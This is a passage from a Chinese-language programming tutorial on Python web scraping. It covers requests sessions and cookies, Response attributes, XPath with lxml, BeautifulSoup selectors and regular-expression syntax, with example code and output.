class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过Session类新建一个会话</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">post_url = <span class="string">&#x27;https://passport.weibo.cn/sso/login&#x27;</span></span><br><span class="line"><span class="comment"># 往下使用requests的地方，直接使用session即可，session就会保存服务器发送过来的cookie信息</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://passport.weibo.cn/signin/login?entry=mweibo&amp;r=http%3A%2F%2Fweibo.cn%2F&amp;backTitle=%CE%A2%B2%A9&amp;vt=&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;17312345678&#x27;</span>, <span class="comment"># 账号</span></span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;password&#x27;</span>, <span class="comment"># 密码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">r = session.post(url=post_url, data=data, headers=headers)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面的session会保存会话，往下发送请求，直接使用session即可</span></span><br><span class="line">url = <span class="string">&#x27;https://weibo.cn/6388179289/info&#x27;</span></span><br><span class="line">headers1 = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">r = session.get(url=url, headers=headers1)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s&#x3D;requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)</span><br><span class="line">r &#x3D; requests.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)</span><br><span class="line">print(s.text)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>可以发现两次get请求第一次有cookie但是第二次没cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;</span><br><span class="line">    &quot;number&quot;: &quot;123456789&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果使用Session()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">s &#x3D; requests.Session()</span><br><span class="line">s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#x2F;set&#x2F;number&#x2F;123456789&#39;)</span><br><span class="line">print(s.text)</span><br><span class="line">r &#x3D; s.get(&#39;https:&#x2F;&#x2F;httpbin.org&#x2F;cookies&#39;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>可以看到两个回话都带有相同cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ python &#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.py</span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;</span><br><span class="line">    &quot;number&quot;: &quot;123456789&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;cookies&quot;: &#123;</span><br><span class="line">    &quot;number&quot;: &quot;123456789&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="requests请求返回对象Response的常用方法"><a href="#requests请求返回对象Response的常用方法" class="headerlink" title="requests请求返回对象Response的常用方法"></a>requests请求返回对象Response的常用方法</h5><p>Response响应类常用属性与方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Response.url           请求url，[见示例2.1]</span><br><span class="line">Response.status_code   响应状态码，[见示例2.1]</span><br><span class="line">Response.text          获取响应内容，[见示例2.1]</span><br><span class="line">Response.json()       活动响应的JSON内容，[见示例2.1]</span><br><span class="line">Response.ok            请求是否成功，status_code&lt;400 返回True</span><br><span class="line">Response.headers       响应header信息，[见示例2.1]</span><br><span class="line">Response.cookies       响应的cookie，[见示例2.1]</span><br><span class="line">Response.elapsed       请求响应的时间。</span><br><span class="line">Response.links         返回响应头部的links连接，相当于Response.headers.get(&#39;link&#39;)</span><br><span class="line">Response.raw           获取原始套接字响应，需要将初始请求参数stream&#x3D;True</span><br><span class="line">Response.content        以字节形式获取响应提，多用于非文本请求，[见示例2.2]</span><br><span class="line">Response.iter_content() 迭代获取响应数据，[见示例2.2]</span><br><span class="line">Response.history重定向请求历史记录</span><br><span class="line">Response.reason响应状态的文本原因，如：&quot;Not Found&quot; or &quot;OK&quot;</span><br><span class="line">Response.close()关闭并释放链接，释放后不能再次访问’raw’对象。一般不会调用。</span><br></pre></td></tr></table></figure><h5 id="requests的content和text方法的区别"><a href="#requests的content和text方法的区别" class="headerlink" title="requests的content和text方法的区别"></a>requests的content和text方法的区别</h5><ul><li><p>resp.text返回的是Unicode型的数据。</p></li><li><p>resp.content返回的是bytes型也就是二进制的数据。</p><p>简而言之，.text是现成的字符串，.content还要编码，但是.text不是所有时候显示都正常，这是就需要用.content进行手动编码。通常我们需要<code>.content.decode(&#39;编码格式&#39;)</code>，其中编码格式我们需要右键网页源代码，查看网页的编码。</p></li><li><p>如果你想取文本，可以通过r.text。</p><p>如果想取图片，文件，则可以通过r.content。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">jpg_url &#x3D; &#39;http:&#x2F;&#x2F;img2.niutuku.com&#x2F;1312&#x2F;0804&#x2F;0804-niutuku.com-27840.jpg&#39;</span><br><span class="line"></span><br><span class="line">content &#x3D; requests.get(jpg_url).content</span><br><span class="line"></span><br><span class="line">with open(&#39;demo.jpg&#39;, &#39;wb&#39;) as fp:</span><br><span class="line">    fp.write(content)</span><br></pre></td></tr></table></figure></li></ul><h3 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h3><h4 id="XPath"><a href="#XPath" class="headerlink" title="XPath"></a>XPath</h4><p>xpath（XML Path Language）是一门在XML和HTML文档中查找信息的语言，可用来在XML和HTML文档中对元素和属性进行遍历。</p><h5 id="XPath语法"><a href="#XPath语法" class="headerlink" title="XPath语法"></a>XPath语法</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200928201555572.png" alt="image-20200928201555572"></p><h5 id="XPATH语法"><a href="#XPATH语法" class="headerlink" title="XPATH语法"></a>XPATH语法</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200928202240146.png" alt="image-20200928202240146"></p><p>补充</p><table><thead><tr><th>/</th><th>如果是在最前面，代表从根节点选取。否则选择某节点下的某个节点</th><th></th></tr></thead><tbody><tr><td>//</td><td>从全局节点中选择节点，随便在哪个位置</td><td></td></tr><tr><td>@</td><td>选取某个节点的属性</td><td></td></tr><tr><td>.</td><td>当前节点</td><td></td></tr></tbody></table><h5 id="lxml库"><a href="#lxml库" class="headerlink" title="lxml库"></a>lxml库</h5><p>lxml 是 一个HTML/XML的解析器，主要的功能是如何解析和提取 HTML/XML 数据。</p><ol><li><p>导入lxml 的 etree 库 <code>from lxml import etree</code></p></li><li><p>利用etree.HTML，将html字符串（bytes类型或str类型）转化为Element对象，Element对象具有xpath的方法，返回结果的列表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">html &#x3D; etree.HTML(text) </span><br><span class="line">ret_list &#x3D; html.xpath(&quot;xpath语法规则字符串&quot;)</span><br></pre></td></tr></table></figure></li><li><p>xpath方法返回列表的三种情况</p><ul><li><p>返回空列表：根据xpath语法规则字符串，没有定位到任何元素</p></li><li><p>返回由字符串构成的列表：xpath字符串规则匹配的一定是文本内容或某属性的值</p></li><li><p>返回由Element对象构成的列表：xpath规则字符串匹配的是标签，列表中的Element对象可以继续进行xpath</p></li></ul></li></ol><h4 id="BeautifulSoup4"><a href="#BeautifulSoup4" class="headerlink" title="BeautifulSoup4"></a>BeautifulSoup4</h4><p>Beautiful Soup 也是一个HTML/XML的解析器，主要的功能也是如何解析和提取 HTML/XML 数据。<br>lxml 只会局部遍历，而Beautiful Soup 是基于HTML DOM（Document Object Model）的，会载入整个文档，解析整个DOM树，因此时间和内存开销都会大很多，所以性能要低于lxml。<br>BeautifulSoup 用来解析 HTML 比较简单，API非常人性化，支持CSS选择器、Python标准库中的HTML解析器，也支持 lxml 的 XML解析器。</p><p>Beautiful Soup将复杂HTML文档转换成一个复杂的树形结构,每个节点都是Python对象,所有对象可以归纳为4种:</p><ol><li>Tag </li><li>NavigatableString </li><li>BeautifulSoup </li><li>Comment</li></ol><h5 id="创建bs对象"><a href="#创建bs对象" class="headerlink" title="创建bs对象"></a>创建bs对象</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoupimport requestsresponse &#x3D; requests.get(&#39;https:&#x2F;&#x2F;book.douban.com&#x2F;&#39;).text# print(response)# 创建bs对象soup &#x3D; BeautifulSoup(response, &#39;lxml&#39;)  # 使用到了lxml解析库</span><br></pre></td></tr></table></figure><h5 id="Tag"><a href="#Tag" class="headerlink" title="Tag"></a>Tag</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">html = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;title&quot; name=&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">soup = BeautifulSoup(html,<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">print(soup.title)</span><br><span class="line">print(soup.head)</span><br><span class="line">print(soup.a)</span><br><span class="line">print(soup.p)</span><br><span class="line">print(type(soup.p))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;The Dormouse&#39;s story&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;a class&#x3D;&quot;sister&quot; href&#x3D;&quot;http:&#x2F;&#x2F;example.com&#x2F;elsie&quot; id&#x3D;&quot;link1&quot;&gt;&lt;!-- Elsie --&gt;&lt;&#x2F;a&gt;</span><br><span class="line">&lt;p class&#x3D;&quot;title&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;class &#39;bs4.element.Tag&#39;&gt;</span><br></pre></td></tr></table></figure><p>我们可以利用 soup 加标签名轻松地获取这些标签的内容，这些对象的类型是bs4.element.Tag。但是注意，它查找的是在所有内容中的第一个符合要求的标签。如果要查询所有的标签，后面会进行介绍。</p><h5 id="Tag的两个重要的属性"><a href="#Tag的两个重要的属性" class="headerlink" title="Tag的两个重要的属性"></a>Tag的两个重要的属性</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">print soup.name</span><br><span class="line"># [document] #soup 对象本身比较特殊，它的 name 即为 [document]</span><br><span class="line"></span><br><span class="line">print soup.head.name</span><br><span class="line"># head #对于其他内部标签，输出的值便为标签本身的名称</span><br><span class="line"></span><br><span class="line">print soup.p.attrs</span><br><span class="line"># &#123;&#39;class&#39;: [&#39;title&#39;], &#39;name&#39;: &#39;dromouse&#39;&#125;</span><br><span class="line"># 在这里，我们把 p 标签的所有属性打印输出了出来，得到的类型是一个字典。</span><br><span class="line"></span><br><span class="line">print soup.p[&#39;class&#39;] # soup.p.get(&#39;class&#39;)</span><br><span class="line"># [&#39;title&#39;] #还可以利用get方法，传入属性的名称，二者是等价的</span><br><span class="line"></span><br><span class="line">soup.p[&#39;class&#39;] &#x3D; &quot;newClass&quot;</span><br><span class="line">print soup.p # 可以对这些属性和内容等等进行修改</span><br><span class="line"># &lt;p class&#x3D;&quot;newClass&quot; name&#x3D;&quot;dromouse&quot;&gt;&lt;b&gt;The Dormouse&#39;s story&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure><h5 id="NavigableString"><a href="#NavigableString" class="headerlink" title="NavigableString"></a>NavigableString</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">如果拿到标签后，还想获取标签中的内容。那么可以通过tag.string获取标签中的文字。示例代码如下：</span><br><span class="line"></span><br><span class="line">print soup.p.string</span><br><span class="line"># The Dormouse&#39;s story</span><br><span class="line"></span><br><span class="line">print type(soup.p.string)</span><br><span class="line"># &lt;class &#39;bs4.element.NavigableString&#39;&gt;thon</span><br></pre></td></tr></table></figure><h5 id="搜索文档树"><a href="#搜索文档树" class="headerlink" title="搜索文档树"></a>搜索文档树</h5><h6 id="find和find-all方法"><a href="#find和find-all方法" class="headerlink" title="find和find_all方法"></a>find和find_all方法</h6><p>搜索文档树，一般用得比较多的就是两个方法，一个是<code>find</code>，一个是<code>find_all</code>。<code>find</code>方法是找到第一个满足条件的标签后就立即返回，只返回一个元素。<code>find_all</code>方法是把所有满足条件的标签都选到，然后返回回去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">soup.find_all(&quot;a&quot;,attrs&#x3D;&#123;&quot;id&quot;:&quot;link2&quot;&#125;)</span><br><span class="line">或者是直接传入属性的的名字作为关键字参数：</span><br><span class="line">soup.find_all(&quot;a&quot;,id&#x3D;&#39;link2&#39;)</span><br></pre></td></tr></table></figure><h6 id="select方法"><a href="#select方法" class="headerlink" title="select方法"></a>select方法</h6><p>使用以上方法可以方便的找出元素。但有时候使用<code>css</code>选择器的方式可以更加的方便。使用<code>css</code>选择器的语法，应该使用<code>select</code>方法。以下列出几种常用的<code>css</code>选择器方法：</p><p>（1）通过标签名查找：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&#x27;a&#x27;</span>))</span><br></pre></td></tr></table></figure><p>（2）通过类名查找：</p><p>通过类名，则应该在类的前面加一个<code>.</code>。比如要查找<code>class=sister</code>的标签。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&#x27;.sister&#x27;</span>))</span><br></pre></td></tr></table></figure><p>（3）通过id查找：</p><p>通过id查找，应该在id的名字前面加一个＃号。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&quot;#link1&quot;</span>))</span><br></pre></td></tr></table></figure><p>（4）组合查找：</p><p>组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&quot;p #link1&quot;</span>))</span><br></pre></td></tr></table></figure><p>直接子标签查找，则使用 &gt; 分隔：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&quot;head &gt; title&quot;</span>))</span><br></pre></td></tr></table></figure><p>（5）通过属性查找：</p><p>查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(soup.select(<span class="string">&#x27;a[href=&quot;http://example.com/elsie&quot;]&#x27;</span>))</span><br></pre></td></tr></table></figure><p>（6）获取内容</p><p>以上的 select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">soup = BeautifulSoup(html, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> type(soup.select(<span class="string">&#x27;title&#x27;</span>))</span><br><span class="line"><span class="keyword">print</span> soup.select(<span class="string">&#x27;title&#x27;</span>)[<span class="number">0</span>].get_text()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> soup.select(<span class="string">&#x27;title&#x27;</span>):</span><br><span class="line">    <span class="keyword">print</span> title.get_text()</span><br></pre></td></tr></table></figure><h3 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h3><h4 id="数量词"><a href="#数量词" class="headerlink" title="数量词"></a><strong>数量词</strong></h4><ul><li><code>&#123;n&#125;</code>——作用于前一个字符或子表达式，匹配它重复n次</li><li><code>&#123;min,max&#125;</code>——作用于前一个字符或子表达式，匹配它重复重复多少次min~max次，min和max可只写一个设置重复下限或上限，但逗号不能省，不写min时min默认为0</li><li><code>*</code>——星号，作用于前一个字符或子表达式，匹配它零次或多次</li><li><code>+</code>——作用于前一个字符或子表达式，匹配它至少一次</li><li><code>?</code>——作用于前一个字符或子表达式，匹配它零次或一次</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r&#39;z&#123;3&#125;&#39;#匹配zzz</span><br><span class="line">r&#39;z&#123;0,3&#125;&#39;#匹配z或zz或zzz</span><br><span class="line">r&#39;(?:abc)&#123;2&#125;&#39;#对子表达式匹配两次，匹配abcabc，(?:)是一个用法，不分组的意思，详看后面</span><br><span class="line">#星号加号问号同理</span><br></pre></td></tr></table></figure><h4 id="预定字符集"><a href="#预定字符集" class="headerlink" title="预定字符集"></a><strong>预定字符集</strong></h4><ul><li><code>\d</code>——匹配任一个数字（0~9）</li><li><code>\D</code>——匹配一个非数字字符，与\d互补</li><li><code>\s</code>——匹配一个空白字符，包括空格，\t,\n,\r,\n,\f,\v</li><li><code>\S</code>——匹配一个非空白字符</li><li><code>\w</code>——匹配一个单词字符。unicode下匹配各种语言的单个字符，单个数字，和下横线。ASCII下匹配单个英文字母，单个数字，和下横线</li><li><code>\W</code>——匹配一个非单词字符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r&#39;\w&#39; #能匹配&#39;物语&amp;ものがたり&#39;中的：物，语，も，の，が，た，り，汉语日语的单字，其他语言同理</span><br></pre></td></tr></table></figure><h4 id="分组-amp-或-amp-转义"><a href="#分组-amp-或-amp-转义" class="headerlink" title="分组&amp;或&amp;转义"></a><strong>分组&amp;或&amp;转义</strong></h4><ul><li><code>()</code>——括号，表达式分组（第n组，n=1，2，3….99，从左往右数），并形成子表达式</li><li><code>(?P&lt;name&gt;)</code>——拥有括号的功能，但能为该分组再指定一个自定名字</li><li><code>(?P=name)</code>——引用分配过名字的分组，但没有分组功能</li><li><code>|</code>——或，左右规则任意匹配一个，从左往右尝试匹配，一旦成功就跳过后面的规则。|没被包在括号中间的话它的作用域是整个表达式，被包的话作用域在括号内</li><li><code>\</code>——反斜杠，后接功能字有符转义功能，后接数字（1到99）有引用分组的功能，后接某些字母又有特殊功能</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r&#39;abc|def|ghi&#39;#匹配abc或def或ghi</span><br><span class="line">r&#39;ma(?:k|d)e&#39;#匹配make或made</span><br><span class="line">r&#39;(abc)def\1&#39;#相当于r&#39;(abc)defabc&#39;,匹配abcdefabc</span><br><span class="line">r&#39;(?P&lt;ok&gt;abc)f(?P&#x3D;ok)&#39;#为(abc)子组分配了“ok”的名字，然后再引用，匹配abcfabc</span><br></pre></td></tr></table></figure><h4 id="边界匹配"><a href="#边界匹配" class="headerlink" title="边界匹配"></a><strong>边界匹配</strong></h4><ul><li><code>^</code>——放在表达式的最前面，作用域是表达式，在多行模式中，在每一行匹配字符串开头（多行模式要手动开启，否则和\A没什么区别）</li><li><code>$</code>——放在表达式的最后面，作用域是表达式，在多行模式中，在每一行匹配字符串末尾（多行模式要手动开启，否则和\Z没什么区别）</li><li><code>\A</code>——放在表达式的最前面，作用域是表达式，匹配字符串开头，不能多行匹配</li><li><code>\Z</code>——放在表达式的最后面，作用域是表达式，匹配字符串末尾，不能多行匹配</li><li><code>\b</code>——不匹配字符，只匹配一个边界，匹配\w和\W或\W和\w的边界（单词字符和非单词字符的边界）</li><li><code>\B</code>——不匹配字符，只匹配一个边界，与\b相反，匹配\w和\w或\W和\W的边界</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">r&#39;^abc|^def&#39;#匹配abc开头或def开头，开启了多行模式时，对字符串&#39;abcd\ndefh&#39;能匹配出abc，def两个</span><br><span class="line">r&#39;abc$|def$&#39;#匹配abc结尾或def结尾，开启了多行模式时，对字符串&#39;0abc\n0def&#39;能匹配出abc，def两个</span><br><span class="line">r&#39;\Aabc&#39;#匹配abc开头，因为不能多行匹配，就算开启多行模式，对字符串&#39;abcd\nabcd&#39;只能匹配到前面的abc</span><br><span class="line">#\Z同理</span><br><span class="line">r&#39;\w\b\W&#39;#匹配“单词字符+非单词字符”的结构如&#39;a!&#39;,&#39;1%&#39;</span><br><span class="line">#\B同理</span><br></pre></td></tr></table></figure><h4 id="标志位-flags"><a href="#标志位-flags" class="headerlink" title="标志位 flags"></a>标志位 flags</h4><p>正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志，如 <code>re.I | re.M</code> 被同时设置成 I 和 M 标志：</p><table><thead><tr><th align="left">修饰符</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">re.I</td><td align="left">忽略大小写（常用）</td></tr><tr><td align="left">re.L</td><td align="left">做本地化识别（locale-aware）匹配</td></tr><tr><td align="left">re.M</td><td align="left">多行匹配，影响 ^ 和 $</td></tr><tr><td align="left">re.S</td><td align="left">使 . 匹配包括换行在内的所有字符</td></tr><tr><td align="left">re.U</td><td align="left">根据Unicode字符集解析字符。这个标志影响 \w, \W, \b, \B.</td></tr><tr><td align="left">re.X</td><td align="left">该标志通过给予更灵活的格式，以便将正则表达式写得更易于理解。</td></tr></tbody></table><h4 id="re模块中的函数"><a href="#re模块中的函数" class="headerlink" title="re模块中的函数"></a>re模块中的函数</h4><h5 id="re-match函数"><a href="#re-match函数" class="headerlink" title="re.match函数"></a>re.match函数</h5><p>match 方法用于查找字符串的头部（也可以指定起始位置），它是一次匹配，只要找到了一个匹配的结果就返回，而不是查找所有匹配的结果。</p><p>一次匹配，只要找到就返回找到的结果。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re   <span class="comment"># 使用之前先进行导入re模块</span></span><br><span class="line">re.match(pattern, string, flags)   <span class="comment"># match方法为例</span></span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">pattern</td><td align="left">匹配的正则表达式</td></tr><tr><td align="left">string</td><td align="left">要匹配的字符串</td></tr><tr><td align="left">flags</td><td align="left">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td></tr></tbody></table><p>该方法的结果是<strong>返回一个正则匹配对象</strong>，通过两个方法获取相关内容：</p><ul><li>通过 <code>group()</code> 来获取内容</li><li>通过 <code>span()</code> 来获取范围：匹配到字符的开始和结束的索引位置</li></ul><h5 id="re-search函数"><a href="#re-search函数" class="headerlink" title="re.search函数"></a>re.search函数</h5><p>re.search<code>方法扫描整个字符串，返回的是第一个成功匹配的字符串，否则就返回</code>None。</p><h5 id="re-split函数"><a href="#re-split函数" class="headerlink" title="re.split函数"></a>re.split函数</h5><p>主要适用于将字符串进行分割：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.split(pattern, string,maxsplit=<span class="number">0</span>,flags=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>用 <code>pattern</code> 分开 